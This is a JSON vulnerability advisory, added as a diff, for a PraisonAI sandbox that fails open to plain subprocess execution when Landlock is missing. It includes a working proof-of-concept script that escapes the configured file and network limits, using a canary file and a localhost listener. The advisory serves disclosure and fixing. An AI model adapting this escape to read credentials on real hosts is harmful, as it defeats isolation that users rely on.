@@ -1,0 +1,143 @@
+{
+  "id": "PYSEC-2026-3504",
+  "modified": "2026-07-23T15:00:16.652683684Z",
+  "published": "2026-07-23T11:41:44.400261Z",
+  "aliases": [
+    "CVE-2026-57144",
+    "GHSA-6jcq-6546-qrrw"
+  ],
+  "summary": "PraisonAI SandlockSandbox falls back to unrestricted subprocess execution when Landlock is unavailable",
+  "details": "## Summary\n\n`praisonai.sandbox.SandlockSandbox` is documented and implemented as the kernel-enforced sandbox backend for untrusted code. Its `SandboxConfig.native()` path lets callers configure allowed filesystem paths and `network=False`.\n\nOn systems where the optional `sandlock` module imports but reports that Landlock is unavailable, `SandlockSandbox.execute()` and `run_command()` do not fail closed. They silently fall back to `SubprocessSandbox(self.config)`.\n\nThat fallback keeps the same high-level native policy object but does not enforce the native filesystem or network boundary during code execution. A sandboxed payload can read files outside the configured allowed path and open network connections despite `network=False`.\n\n## Technical Details\n\n`SandboxConfig.native()` creates a restricted native policy and records caller-provided writable paths plus the requested network posture:\n\n```python\nreturn cls(\n    sandbox_type=\"native\",\n    working_dir=os.getcwd(),\n    security_policy=SecurityPolicy(\n        allow_network=network,\n        allow_file_write=True,\n        allow_subprocess=True,\n        allowed_paths=resolved_paths,\n    ),\n    metadata={\"writable_paths\": resolved_paths, \"network\": network},\n)\n```\n\n`SandlockSandbox` builds the intended kernel policy with Landlock-backed filesystem allowlisting and network denial:\n\n```python\npolicy = Policy(\n    fs_readable=allowed_read_paths,\n    fs_writable=allowed_write_paths,\n    net_allow_hosts=[] if not limits.network_enabled else None,\n    max_memory=f\"{limits.memory_mb}M\",\n    max_processes=limits.max_processes,\n    max_open_files=limits.max_open_files,\n)\n```\n\nHowever, both execution paths fail open when Sandlock is unavailable:\n\n```python\nif not self.is_available:\n    logger.warning(\"Sandlock not available, falling back to subprocess\")\n    from .subprocess import SubprocessSandbox\n    fallback = SubprocessSandbox(self.config)\n    return await fallback.execute(code, language, limits, env, working_dir)\n```\n\n`SubprocessSandbox.execute()` writes the code to a temp file and runs `python` with a minimal environment and POSIX rlimits. It does not install a filesystem sandbox, network namespace, syscall filter, chroot, Landlock policy, or path allowlist for the code execution path. The `safe_sandbox_path()` checks only protect the `read_file()`, `write_file()`, and `list_files()` helper methods.\n\n### Why This Is Not Intended Behavior\n\nThe report is not based only on a trust-model disagreement. The code and docs define a concrete boundary:\n\n- PraisonAI's Sandlock README says the backend provides kernel-level filesystem allowlisting, network isolation, seccomp filtering, and blocks `/etc/passwd`, SSH keys, AWS credentials, and unauthorized connections.\n- The security demo creates `SandboxConfig.native(writable_paths=[\"./safe_workspace\"], network=False)` and labels file and network access as blocked operations.\n- The upstream `sandlock` package requires Linux with a compatible Landlock ABI and documents a fail-closed default for missing required protections unless the caller explicitly opts into degraded protection.\n- PraisonAI's own current security page recommends sandboxed execution and says path traversal protection is enabled by default for local sandbox backends.\n\nThe bug is the silent fallback from an unavailable kernel-enforced boundary to plain subprocess execution without preserving the configured native policy.\n\n## PoV\n\nRun from a PraisonAI source checkout:\n\n```bash\npython3 poc/pov_poc.py \\\n  --repo /path/to/PraisonAI\n```\n\nThe PoV:\n\n1. injects a fake `sandlock` module that imports successfully but reports no usable Landlock support;\n2. configures `SandboxConfig.native(writable_paths=[tenant_a], network=False)`;\n3. creates `tenant-b-secret.txt` outside the configured path;\n4. starts a localhost TCP listener;\n5. executes code through `SandlockSandbox.execute()`.\n\nObserved result on `v4.6.58`:\n\n```json\n{\n  \"child_output\": {\n    \"network_reply\": \"local-ok\",\n    \"outside_read\": \"TENANT_B_CANARY\"\n  },\n  \"configured_network\": false,\n  \"outside_path_under_allowed\": false,\n  \"sandlock_available\": false,\n  \"sandbox_type\": \"sandlock\",\n  \"status\": \"COMPLETED\",\n  \"vulnerable\": true\n}\n```\n\nThis proves both policy boundaries are crossed:\n\n- the file read target is not under the configured allowed path;\n- the localhost network connection succeeds even though the native policy was created with `network=False`.\n\nFull PoV script:\n\n```python\n#!/usr/bin/env python3\n\"\"\"Local-only PoV for poc.\n\nThe PoV simulates a system where the optional ``sandlock`` Python package is\ninstalled but kernel Landlock support is unavailable. That is the exact branch\nhandled by ``SandlockSandbox.execute()``: it logs a warning and falls back to\n``SubprocessSandbox``.\n\nNo external network is used. The network control is a localhost TCP listener.\nNo sensitive host files are read. The filesystem control uses temporary tenant\ndirectories and a canary file outside the configured writable path.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport asyncio\nimport contextlib\nimport json\nimport os\nimport pathlib\nimport socket\nimport sys\nimport tempfile\nimport types\nfrom typing import Any\n\ndef _repo_paths(repo: pathlib.Path) -\u003e list[str]:\n    return [\n        str(repo / \"src\" / \"praisonai\"),\n        str(repo / \"src\" / \"praisonai-agents\"),\n    ]\n\nasync def _accept_once(server: socket.socket) -\u003e str | None:\n    loop = asyncio.get_running_loop()\n\n    def accept() -\u003e str:\n        conn, _ = server.accept()\n        with conn:\n            data = conn.recv(128)\n            conn.sendall(b\"local-ok\")\n        return data.decode(\"utf-8\", \"replace\")\n\n    with contextlib.suppress(Exception):\n        return await loop.run_in_executor(None, accept)\n    return None\n\nasync def run_pov(repo: pathlib.Path) -\u003e dict[str, Any]:\n    sandlock_path = repo / \"src\" / \"praisonai\" / \"praisonai\" / \"sandbox\" / \"sandlock.py\"\n    if not sandlock_path.exists():\n        return {\"repo\": str(repo), \"has_sandlock\": False, \"vulnerable\": False}\n\n    sys.path[:0] = _repo_paths(repo)\n\n    # Support both the original v4.5.110 API check and the current v4.6.58 API\n    # check while forcing the \"Sandlock not available\" branch.\n    sys.modules[\"sandlock\"] = types.SimpleNamespace(\n        is_available=lambda: False,\n        landlock_abi_version=lambda: 0,\n    )\n\n    from praisonai.sandbox.sandlock import SandlockSandbox\n    from praisonaiagents.sandbox import ResourceLimits, SandboxConfig\n\n    with tempfile.TemporaryDirectory(prefix=\"poc-\") as temp_root:\n        base = pathlib.Path(temp_root)\n\n        # Make the PoV deterministic on systems where \"python\" is not on PATH.\n        bindir = base / \"bin\"\n        bindir.mkdir()\n        (bindir / \"python\").symlink_to(sys.executable)\n\n        allowed = base / \"tenant-a\"\n        allowed.mkdir()\n        outside = base / \"tenant-b-secret.txt\"\n        outside.write_text(\"TENANT_B_CANARY\", encoding=\"utf-8\")\n\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.bind((\"127.0.0.1\", 0))\n        server.listen(1)\n        server.settimeout(5)\n        port = server.getsockname()[1]\n\n        config = SandboxConfig.native(writable_paths=[str(allowed)], network=False)\n        sandbox = SandlockSandbox(config=config)\n        await sandbox.start()\n\n        code = f\"\"\"\nimport json\nimport socket\n\nresult = {{}}\n\ntry:\n    with open({str(outside)!r}, \"r\") as f:\n        result[\"outside_read\"] = f.read()\nexcept Exception as exc:\n    result[\"outside_read_error\"] = type(exc).__name__ + \": \" + str(exc)\n\ntry:\n    s = socket.create_connection((\"127.0.0.1\", {port}), timeout=3)\n    s.sendall(b\"hello\")\n    result[\"network_reply\"] = s.recv(32).decode(\"utf-8\", \"replace\")\n    s.close()\nexcept Exception as exc:\n    result[\"network_error\"] = type(exc).__name__ + \": \" + str(exc)\n\nprint(json.dumps(result, sort_keys=True))\n\"\"\"\n\n        accept_task = asyncio.create_task(_accept_once(server))\n        result = await sandbox.execute(\n            code,\n            limits=ResourceLimits(\n                timeout_seconds=10,\n                memory_mb=512,\n                max_processes=10,\n                max_open_files=64,\n                network_enabled=False,\n            ),\n            env={\"PATH\": str(bindir)},\n        )\n\n        accepted_payload = None\n        with contextlib.suppress(Exception):\n            accepted_payload = await accept_task\n\n        server.close()\n        await sandbox.stop()\n\n        child_output: dict[str, Any] = {}\n        with contextlib.suppress(Exception):\n            child_output = json.loads(result.stdout.strip())\n\n        vulnerable = (\n            child_output.get(\"outside_read\") == \"TENANT_B_CANARY\"\n            and child_output.get(\"network_reply\") == \"local-ok\"\n        )\n\n        return {\n            \"repo\": str(repo),\n            \"has_sandlock\": True,\n            \"sandbox_type\": sandbox.sandbox_type,\n            \"sandlock_available\": sandbox.is_available,\n            \"configured_allowed_paths\": config.security_policy.allowed_paths,\n            \"configured_network\": config.security_policy.allow_network,\n            \"outside_path_under_allowed\": str(outside).startswith(str(allowed) + os.sep),\n            \"status\": getattr(result.status, \"name\", str(result.status)),\n            \"exit_code\": result.exit_code,\n            \"stdout\": result.stdout.strip(),\n            \"stderr\": result.stderr.strip(),\n            \"error\": result.error,\n            \"child_output\": child_output,\n            \"accepted_local_payload\": accepted_payload,\n            \"vulnerable\": vulnerable,\n        }\n\ndef main() -\u003e int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--repo\", required=True, type=pathlib.Path)\n    args = parser.parse_args()\n\n    result = asyncio.run(run_pov(args.repo.resolve()))\n    print(json.dumps(result, indent=2, sort_keys=True))\n\n    if result.get(\"has_sandlock\") and not result.get(\"vulnerable\"):\n        return 1\n    return 0\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\n## PoC\n\nThe PoV section above contains the local reproduction command, input, and decisive output.\n\n## Impact\n\nIf a PraisonAI user or service relies on `SandlockSandbox` / native sandboxing for untrusted code isolation on a host without the required Landlock support, code submitted to the sandbox can execute with the host user's normal filesystem and network access.\n\nConcrete impact includes:\n\n- reading files outside the configured tenant/workspace path;\n- reading project files, credentials, `.env` files, SSH material, or cloud config reachable by the PraisonAI process user;\n- connecting to loopback or internal services despite `network=False`;\n- moving from sandboxed code execution to unsandboxed host-user code execution in deployments that treat Sandlock as the isolation boundary.\n\nThe local PoV does not read real sensitive files or contact external systems. It uses temporary tenant directories and a localhost TCP listener.\n\n## Suggested Fix\n\nFail closed when the requested native sandbox boundary cannot be enforced.\n\nRecommended changes:\n\n1. In `SandlockSandbox.execute()` and `run_command()`, return a failed `SandboxResult` or raise a clear runtime error when `self.is_available` is false.\n2. If fallback behavior is kept for developer convenience, require an explicit opt-in such as `allow_degraded=True` or `fallback=\"subprocess\"` and surface that degraded state in the result metadata.\n3. Do not preserve `sandbox_type == \"sandlock\"` in status metadata when the actual execution backend is subprocess.\n4. Add regression tests proving that unavailable Landlock does not execute code unless degraded fallback was explicitly requested.\n5. Add tests that a native policy with `network=False` and a restricted path cannot read outside-path canaries or connect to a localhost listener.\n6. Document the required kernel/ABI versions and the exact degraded-mode semantics.\n\n## Affected Package/Versions\n\n- Repository: `MervinPraison/PraisonAI`\n- Package: `praisonai`\n- Component: `src/praisonai/praisonai/sandbox/sandlock.py`\n- Related config component: `src/praisonai-agents/praisonaiagents/sandbox/config.py`\n- Latest verified release/current head: `v4.6.58`, `1ad58ca02975ff1398efeda694ea2ab78f20cf3e`\n\nConfirmed affected:\n\n```text\nv4.5.110  vulnerable\nv4.5.120  vulnerable\nv4.6.58   vulnerable\ncurrent   vulnerable\n```\n\nNegative control:\n\n```text\nv4.5.109  not affected because SandlockSandbox is absent\n```\n\nSuggested affected range: `\u003e= 4.5.110, \u003c= 4.6.58`.\n\nNo fixed version is known at submission time.\n\n### Version Sweep\n\n```text\nversion              has_sandlock  sandlock_available  status     outside_read     network_reply  vulnerable\npraisonai-v4.5.109   false                                               false\npraisonai-v4.5.110   true          false               COMPLETED  TENANT_B_CANARY  local-ok       true\npraisonai-v4.6.58    true          false               COMPLETED  TENANT_B_CANARY  local-ok       true\npraisonai-current    true          false               COMPLETED  TENANT_B_CANARY  local-ok       true\n```\n\nGitHub history for `sandlock.py` shows the backend was introduced in `4ee7d298c89f` on 2026-04-01 with \"graceful fallback to SubprocessSandbox\", then updated in `7ae6c6d19c31` on 2026-04-02 to use the current Landlock ABI check.\n\n## Advisory History\n\nNearby advisories are distinct:\n\n- `GHSA-r4f2-3m54-pp7q` / `CVE-2026-34955`: `SubprocessSandbox` shell command escape through `4.5.96`.\n- `GHSA-4mr5-g6f9-cfrh`, `GHSA-qf73-2hrx-xprp`, `GHSA-6vh2-h83c-9294`: `execute_code()` Python sandbox escapes.\n- `GHSA-ch89-h4r2-c8f8`: agent tools workspace escape via symlinks.\n- `GHSA-gcq3-mfvh-3x25`: PraisonAI Code agent tool workspace fail-open.\n\nThis report covers a different root cause: `SandlockSandbox` / native sandbox policy downgrade when Landlock is unavailable. It reproduces on the latest release `v4.6.58`, while the older `SubprocessSandbox` shell escape advisory was fixed at `4.5.97`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "praisonai",
+        "purl": "pkg:pypi/praisonai"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.5.110"
+            },
+            {
+              "fixed": "4.6.61"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.5.110",
+        "4.5.111",
+        "4.5.112",
+        "4.5.113",
+        "4.5.114",
+        "4.5.115",
+        "4.5.117",
+        "4.5.118",
+        "4.5.119",
+        "4.5.120",
+        "4.5.121",
+        "4.5.122",
+        "4.5.123",
+        "4.5.124",
+        "4.5.125",
+        "4.5.126",
+        "4.5.127",
+        "4.5.128",
+        "4.5.129",
+        "4.5.130",
+        "4.5.131",
+        "4.5.132",
+        "4.5.133",
+        "4.5.134",
+        "4.5.135",
+        "4.5.136",
+        "4.5.137",
+        "4.5.139",
+        "4.5.140",
+        "4.5.143",
+        "4.5.144",
+        "4.5.145",
+        "4.5.149",
+        "4.6.10",
+        "4.6.11",
+        "4.6.12",
+        "4.6.13",
+        "4.6.14",
+        "4.6.15",
+        "4.6.16",
+        "4.6.18",
+        "4.6.19",
+        "4.6.20",
+        "4.6.21",
+        "4.6.22",
+        "4.6.23",
+        "4.6.24",
+        "4.6.25",
+        "4.6.26",
+        "4.6.27",
+        "4.6.28",
+        "4.6.29",
+        "4.6.30",
+        "4.6.31",
+        "4.6.32",
+        "4.6.33",
+        "4.6.34",
+        "4.6.35",
+        "4.6.36",
+        "4.6.37",
+        "4.6.38",
+        "4.6.39",
+        "4.6.40",
+        "4.6.41",
+        "4.6.42",
+        "4.6.43",
+        "4.6.44",
+        "4.6.45",
+        "4.6.46",
+        "4.6.47",
+        "4.6.48",
+        "4.6.50",
+        "4.6.51",
+        "4.6.52",
+        "4.6.53",
+        "4.6.54",
+        "4.6.55",
+        "4.6.56",
+        "4.6.57",
+        "4.6.58",
+        "4.6.59",
+        "4.6.60",
+        "4.6.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/praisonai/PYSEC-2026-3504.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6jcq-6546-qrrw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MervinPraison/PraisonAI"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/praisonai"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-6jcq-6546-qrrw"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-57144"
+    }
+  ]
+}
